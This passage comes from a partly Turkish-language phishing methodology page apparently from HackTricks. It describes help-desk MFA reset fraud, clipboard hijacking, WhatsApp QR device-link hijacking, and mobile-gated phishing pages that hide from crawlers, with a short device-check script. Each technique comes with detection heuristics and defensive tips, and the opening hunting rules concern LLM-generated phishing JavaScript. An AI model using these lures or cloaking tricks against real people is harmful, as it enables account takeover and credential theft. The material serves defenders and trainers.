- Hunt for front-end POSTs to LLM APIs immediately followed by `eval`/`Function` on returned text.
- Alert on unsanctioned LLM domains in client traffic plus subsequent credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Besides classic push-bombing, operators simply **force a new MFA registration** during the help-desk call, nullifying the user’s existing token.  Any subsequent login prompt appears legitimate to the victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta olaylarında **`deleteMFA` + `addMFA`** olaylarını aynı IP’den **dakikalar içinde** gerçekleşecek şekilde izleyin.



## Clipboard Hijacking / Pastejacking

Saldırganlar, ele geçirilmiş veya typosquatted bir web sayfasından kurbanın clipboard’una sessizce kötü amaçlı komutlar kopyalayabilir ve ardından kullanıcıyı bunları **Win + R**, **Win + X** veya bir terminal penceresine yapıştırması için kandırarak herhangi bir indirme veya ek olmadan rastgele code çalıştırabilir.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Bir lure page (ör. sahte ministry/CERT “channel”) bir WhatsApp Web/Desktop QR gösterir ve kurbandan bunu taramasını ister; böylece saldırgan sessizce **linked device** olarak eklenir.
* Saldırgan hemen chat/contact görünürlüğü elde eder, ta ki session kaldırılana kadar. Kurbanlar daha sonra “new device linked” bildirimi görebilir; defender’lar güvensiz QR sayfalarını ziyaret ettikten kısa süre sonra beklenmedik device-link olaylarını avlayabilir.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operatörler, desktop crawler’ların final sayfalara hiç ulaşmaması için phishing akışlarını giderek daha fazla basit bir device check arkasına alıyor. Yaygın bir pattern, touch-capable bir DOM’u test eden ve sonucu bir server endpoint’ine gönderen küçük bir script’tir; mobile olmayan client’lar HTTP 500 (veya boş bir sayfa) alırken, mobile user’lara tam akış sunulur.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logic (simplified):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Sunucu davranışı genellikle gözlemlenen:
- İlk yükleme sırasında bir session cookie ayarlar.
- `POST /detect {"is_mobile":true|false}` isteğini kabul eder.
- `is_mobile=false` olduğunda sonraki GET isteklerine 500 (veya placeholder) döner; phishing yalnızca `true` ise sunulur.

Tespit ve avlama heuristikleri:
- urlscan sorgusu: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: `GET /static/detect_device.js` → `POST /detect` → mobil olmayan için HTTP 500 sırası; meşru mobil kurban yolları 200 döner ve ardından HTML/JS gelir.
- İçeriği yalnızca `ontouchstart` veya benzeri device checks koşuluna bağlayan sayfaları engelleyin veya dikkatle inceleyin.

Savunma ipuçları:
- Gated içeriği ortaya çıkarmak için crawler'ları mobile-like fingerprints ve JS enabled ile çalıştırın.
- Yeni kayıtlı domainlerde `POST /detect` sonrasında gelen şüpheli 500 yanıtları için alarm üretin.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
